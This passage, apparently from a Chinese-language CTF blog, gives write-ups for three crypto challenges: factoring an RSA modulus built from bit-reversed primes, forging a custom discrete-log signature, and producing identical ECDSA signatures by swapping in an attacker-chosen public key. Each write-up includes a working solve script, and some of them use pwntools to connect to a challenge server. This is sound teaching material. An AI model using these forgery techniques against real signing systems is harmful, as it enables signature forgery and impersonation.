long_to_bytes(pow(enc,d,n))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.decode().startswith(<span class="string">'flag&#123;'</span>)) <span class="keyword">and</span> (flag.decode().endswith(<span class="string">'&#125;'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(x)</span>:</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">y = y*<span class="number">2</span> + x%<span class="number">2</span></span><br><span class="line">x = x // <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = reverse(p)</span><br><span class="line"><span class="keyword">if</span> is_prime(q):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">enc = powmod(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = </span></span><br><span class="line"><span class="comment">#enc =</span></span><br></pre></td></tr></table></figure><p>这一道题就是一个正常的RSA，但是生成的p和q再二进制上是相反的，即若p是11（0b1011），那么q就是13（0b1101）</p><p>其实有点像一个算法题，我们可以通过测试得知，如果p * q = n ，那么p的最低位 乘以 q的最低为 等于 n 的最低为，基于这个事实，我们可以从最低位一位一位爆破p和q，但是实际操作后会发现，可能性太多，无法剪枝，那么复杂度过高的情况下这种做法是不可取的。</p><p>所以我们在以上的基础再加一个判断：</p><p>由于我们知道 p的高位是q的低位，那么我们将p反过来然后末尾补0，补齐512位，这个肯定会比真真的q小，同理将q反过来末尾补0，这样子我们可以得到p_min 和 q_min，那么p_min * q_min 肯定是小于 n的，如果p_min * q_min &gt; n，那么就可以舍弃这个可能性。</p><p>同理末尾补1就能得到p_max 和 q_max ，如果p_max * q_max &lt; n 那么这种可能行也可以舍弃</p><p>参考代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">n = <span class="number">158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889</span></span><br><span class="line">ct = <span class="number">103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745</span></span><br><span class="line"></span><br><span class="line">max_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">pq_list = [(<span class="number">1</span>,<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">512</span>):</span><br><span class="line">    mod = <span class="number">2</span> ** (idx + <span class="number">1</span>)</span><br><span class="line">    new_pq_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> pq_list:</span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> product(range(<span class="number">2</span>), repeat=<span class="number">2</span>):</span><br><span class="line">            np = i * <span class="number">2</span> ** idx + p</span><br><span class="line">            nq = j * <span class="number">2</span> ** idx + q</span><br><span class="line"></span><br><span class="line">            <span class="comment">#judge1</span></span><br><span class="line">            <span class="keyword">if</span> (np * nq) % mod != n % mod:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line"><span class="comment">#judge2</span></span><br><span class="line">            rp_min = int(<span class="string">'&#123;:b&#125;'</span>.format(np)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'0'</span>), <span class="number">2</span>)</span><br><span class="line">            rq_min = int(<span class="string">'&#123;:b&#125;'</span>.format(nq)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'0'</span>), <span class="number">2</span>)</span><br><span class="line">            rp_max = int(<span class="string">'&#123;:b&#125;'</span>.format(np)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'1'</span>), <span class="number">2</span>)</span><br><span class="line">            rq_max = int(<span class="string">'&#123;:b&#125;'</span>.format(nq)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'1'</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> n &lt; rp_min * rq_min <span class="keyword">or</span> rp_max * rq_max &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line"><span class="comment">#可能性集合</span></span><br><span class="line">            new_pq_list.append((np, nq))</span><br><span class="line">            </span><br><span class="line">    print(len(new_pq_list))</span><br><span class="line">    print(idx)</span><br><span class="line">    </span><br><span class="line">    pq_list = new_pq_list</span><br></pre></td></tr></table></figure><p>运行代码大概要个十多分钟。然后可能性集合能达到快二十万，我们遍历这个集合，找到其中的两个512位素数即为p和q，进而RSA解密即可。</p><p>然后是两个需要交互的题目，给的是Crypto_System，一个给了源码， 一个没给，但两道题核心都是构造一个等式然后解方程。先来看看这个给了源码的。</p><h2 id="Crypto-System"><a href="#Crypto-System" class="headerlink" title="Crypto_System"></a>Crypto_System</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># These three are constants</span></span><br><span class="line">p = <span class="number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span></span><br><span class="line">g = <span class="number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># random generation</span></span><br><span class="line">m1 = <span class="string">"test1"</span></span><br><span class="line">m2 = <span class="string">"test2"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialization</span></span><br><span class="line">r1, s1 = sign(m1)</span><br><span class="line"><span class="comment"># r1 will be provided to player</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2str</span><span class="params">(data, mode=<span class="string">"big"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"little"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"big"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[::<span class="number">-1</span>][_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameter</span><span class="params">(m)</span>:</span></span><br><span class="line">    x = int2str(m, <span class="string">'little'</span>)</span><br><span class="line">    y = powmod(g, x, p)</span><br><span class="line">    a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(<span class="number">128</span>, <span class="string">"\0"</span>)).digest())</span><br><span class="line">    b = powmod(a, a, p - <span class="number">1</span>)</span><br><span class="line">    h = powmod(g, b, p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y, h, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    r = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    s = (y * powmod(h, r, p)) % p </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(r),str(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(m, r, s)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    <span class="keyword">if</span> s == ((y * powmod(h, r, p)) % p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Give me the (r2,s2)</span></span><br><span class="line"><span class="keyword">if</span> r2 != r1 <span class="keyword">and</span> s2 == s1 <span class="keyword">and</span> verify(m2, r2, s2):</span><br><span class="line">    print(<span class="string">"Congratulation!Here is your flag: %s"</span> % flag)</span><br></pre></td></tr></table></figure><p>这道题的他会提供两个msg，然后你需要给他们签名，要求是，签名中两者的s相等，但是r不相等</p><p>我们提取一下信息，</p><p>签名的验证是 s == ((y * powmod(h, r, p)) % p)</p><p>其中 x 就是要被签名的信息， y = powmod(g, x, p)， h = powmod(g, b, p) ，  b = powmod(a, a, p - 1) ，</p><p>a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, “\0”)).digest()) ,显得挺麻烦，但是由于我们是知道参数x, g, p的，因此y是一个已知的常数，从而a也可以看成一个已知常数即可，继而b、h也会是一个已知常数。（全都已知，完全不用管了）</p><p>那么s = powmod(g, x, p) * powmod(powmod(g, b, p), r, p)) == powmod(g, x + br, p)</p><p>我们要给不同的x，有着相同的s和不同的r，那么可以构造我们的目标等式： powmod(g, x1 + b1r1, p) == powmod(g, x2 + b2r2, p)</p><p>很自然的我们可以把这个方程转化为 x1 + b1r1 == x2 + b2r2，由于模数p，那么g应该是一个原根叭。那么阶就是p - 1了，所以完整的应该是 x1 + b1r1 ≡ x2 + b2r2 （mod p - 1 ）    固定r1，那么有r2 = (x1 + b1r1 - x2) * inverse(b2 , p-1)，</p><p>这里会有一个问题，就是b2 和 p - 1不互素怎么办？撞就完事了，由于决定b2的是msg2，每次连接msg2都是随机的，所以撞就完事，经过测试，互素的概率还是蛮高的。</p><p>或者也可以提前将方程两边整除b2 和 p - 1的公因数，但如果没法整除，那就GG了，还是撞叭23333 </p><p>参考脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">"139.129.98.9"</span>,<span class="string">"30001"</span>)</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"XXXX+"</span>)</span><br><span class="line">    suffix = sh.recvuntil(<span class="string">')'</span>).decode(<span class="string">"utf8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    log.success(suffix)</span><br><span class="line">    sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">    cipher = sh.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># These three are constants</span></span><br><span class="line">p = <span class="number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span></span><br><span class="line">g = <span class="number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2str</span><span class="params">(data, mode=<span class="string">"big"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"little"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"big"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[::<span class="number">-1</span>][_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameter</span><span class="params">(m)</span>:</span></span><br><span class="line">    x = int2str(m, <span class="string">'little'</span>)</span><br><span class="line">    y = pow(g, x, p)</span><br><span class="line">    a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(<span class="number">128</span>, <span class="string">b"\0"</span>)).digest())</span><br><span class="line">    b = pow(a, a, p - <span class="number">1</span>)</span><br><span class="line">    h = pow(g, b, p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y, h, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    r = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    s = (y * powmod(h, r, p)) % p </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(r),str(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(m, r, s)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    <span class="keyword">if</span> s == ((y * powmod(h, r, p)) % p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the frist message(64 bytes):"</span>)</span><br><span class="line">message1 = bytes.fromhex(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].decode()).decode()</span><br><span class="line">sh.recvuntil(<span class="string">"Here is the second message(64 bytes):"</span>)</span><br><span class="line">message2 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].decode()</span><br><span class="line">print(<span class="string">"message2"</span>,message2)</span><br><span class="line">message2 = bytes.fromhex(message2).decode()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The frist message's 'r':"</span>)</span><br><span class="line">message1_r = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据题目获取各个参数</span></span><br><span class="line">message1_y, message1_h, message1_b = get_parameter(message1)</span><br><span class="line">message1_s = (message1_y * pow(message1_h, message1_r, p)) % p</span><br><span class="line">message2_s = message1_s</span><br><span class="line">message2_y, message2_h, message2_b = get_parameter(message2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"><span class="comment">#解题核心</span></span><br><span class="line"><span class="comment">#x1+b1r1=x2+b2r2</span></span><br><span class="line"></span><br><span class="line">x1 = int2str(message1, <span class="string">'little'</span>)</span><br><span class="line">b1 = message1_b</span><br><span class="line">r1 = message1_r</span><br><span class="line">x2 = int2str(message2, <span class="string">'little'</span>)</span><br><span class="line">b2 = message2_b</span><br><span class="line">tmp = gcd(b2,p<span class="number">-1</span>)</span><br><span class="line">print(tmp)</span><br><span class="line">r2 = (((x1+b1*r1-x2)//tmp)*inverse(b2//tmp,p<span class="number">-1</span>))%(p<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the (r,s) of the second message:"</span>)</span><br><span class="line">print(<span class="string">"("</span>+str(r2)+<span class="string">","</span>+str(message2_s)+<span class="string">")"</span>)</span><br><span class="line">sh.sendline(<span class="string">"("</span>+str(r2)+<span class="string">","</span>+str(message2_s)+<span class="string">")"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h2><p>这道题贼狠，源码都不给，来看一看MENU叭</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0xd</span> bytes:</span><br><span class="line">    b<span class="string">'Give me XXXX:'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Sent <span class="number">0x5</span> bytes:</span><br><span class="line">    b<span class="string">'bwUI\n'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0x4f</span> bytes:</span><br><span class="line">    b<span class="string">'Hello,guys!Welcome to my ECC Signature System!I promise no one can exploit it!\n'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0x269</span> bytes:</span><br><span class="line">    b<span class="string">'Howevers if you can exploit it in 10 times,I will give what you want!\n'</span></span><br><span class="line">    b<span class="string">'Here is the frist message(64 bytes):fipoN9jy/*@~J:] PcZY8&#123;&amp;X!7v+\\duTln_#k(WK^Q2L)&lt;SbM$-V=Ex3Uw|h,%&#125;F\n'</span></span><br><span class="line">    b<span class="string">'Here is the second message(64 bytes):%wh-(xJ4kR+7&lt;^Zv9,Ol\\Kp/&amp;"FHbc_ D@Y*mSos&#125;V?.#L&#123;!3B8QiP=nqCI[y:X2\n'</span></span><br><span class="line">    b<span class="string">'Try to calculate the same signature for this two messages~\n'</span></span><br><span class="line">    b<span class="string">'(((Notice: curve = SECP256k1, hashfunc = sha1)))\n'</span></span><br><span class="line">    b<span class="string">'\n'</span></span><br><span class="line">    b<span class="string">'ECC Signature System:\n'</span></span><br><span class="line">    b<span class="string">'    1. Show your pubkey\n'</span></span><br><span class="line">    b<span class="string">'    2. Generate new prikey\n'</span></span><br><span class="line">    b<span class="string">'    3. Update your pubkey\n'</span></span><br><span class="line">    b<span class="string">'    4. Sign a message\n'</span></span><br><span class="line">    b<span class="string">'    5. Verify a message\n'</span></span><br><span class="line">    b<span class="string">'    6. Exploit\n'</span></span><br><span class="line">    b<span class="string">'    7. Exit\n'</span></span><br><span class="line">    b<span class="string">'\n'</span></span><br><span class="line">    b<span class="string">'You have only 10 times to operate!\n'</span></span><br><span class="line">    b<span class="string">'Please choice your options:'</span></span><br></pre></td></tr></table></figure><p>根据题目名这是一个ECDSA的签名系统，完了呢要求是给这他提供的两个msg签名，不仅验证要通过，而且签名还得一样。</p><p>先来看看这几个功能，</p><p>功能1是显示公钥，（可能要利用）</p><p>功能2是重新生成一个私钥，（应该是没用的，没啥意义，生成后就是告诉你更新后的公钥）</p><p>功能3是更新你的公钥，你来输入（这个肯定有点用）</p><p>功能4是帮你签个名 （也许用得上）</p><p>功能5是验证签名 （可以，但没必要）</p><p>功能6就是整完了用来获取flag的了。</p><p>六个功能一眼看来也就这个功能3可以用了。这里需要一点前置知识（现查就可以了，一样的），就是ECDSA签名的验证规则</p><p>这种<a href="https://blog.csdn.net/s_lisheng/article/details/79871341" target="_blank" rel="noopener">资料</a>CSDN一抓一大把。</p><p><img src="https://i.loli.net/2020/12/07/z9EpbT2FRwQrHkg.png" alt="image-20201207214850259"></p><p>最后是判断 v = r，即 X.x = dG.x ,我们可以把验证公式提取出来，也即 $es^{-1}G + rs^{-1}Q = dG$</p><p>注意到由于验证用的是公钥Q，然后题目是提供篡改公钥这个功能的，我们知道ECDSA中$Q = kG$, 其中k是私钥，那么其实等价于我们是可以篡改私钥的，即我们用自己的私钥去给一个信息签名，完了后把用于验证的公钥给改成我们自己的公钥，验证同样也是可以通过的。那么整个过程系统的私钥都不参与了。</p><p>解决了签名验证的问题，剩下来就是解决如何让他们的签名保持一致了。</p><p>回到验证公式 $es^{-1}G + rs^{-1}Q = dG$</p><p>其中e是我们的消息，可以看作已知常数，r和s是我们能控制的，G是固定的，Q是公钥，也是我们自己决定，d是签名时用的随机数，整个签名的过程我们都能掌握，自然d也有我们决定，然后d会决定r，因为r = dG.x， 那么r也就固定下来了，只剩Q和s了。</p><p>我们把公式约一约，去掉G后就是 $es^{-1} + rs^{-1}k = d  =&gt; e + rk = ds =&gt; s = (e + rk)*d^{-1}$</p><p>由于两个msg的s要保持一直，那么我们构造的等式就是$ (e_1 + rk) * d^{-1} = (e_2 + rk) * d^{-1}$</p><p>很显然啊，因为d不能等于0，这等式不可能成立啊，于是陷入僵局。</p><p>但这里我们忘了一个很重要的性质，就是，我们最后验证的是v = r，而r是什么，r = dG.x，我们要知道的是，椭圆曲线是一个关于x轴对称的图形，所以其实 r = -dG.x。华点都发现了，这题就解决了，</p><p>等式变为$ (e_1 + rk) * d^{-1} = (e_2 + rk) * (-d)^{-1}$</p><p>化成同余式就是$ (e_1 + rk) * d^{-1} \equiv (e_2 + rk) * (-d)^{-1} \pmod{n}$</p><p>有 $e_1 + rk \equiv -e_2 -rk\pmod{n}$</p><p>有 $k \equiv \frac{-e1-e2}{2r}\pmod{n}$</p><p>然后怕【我们去查一下这条曲线的<a href="https://www.secg.org/sec2-v2.pdf" target="_blank" rel="noopener">参数</a>即可</p><p>参考脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">"139.129.98.9"</span>,<span class="string">"30002"</span>)</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">7</span></span><br><span class="line">q=<span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">gx=<span 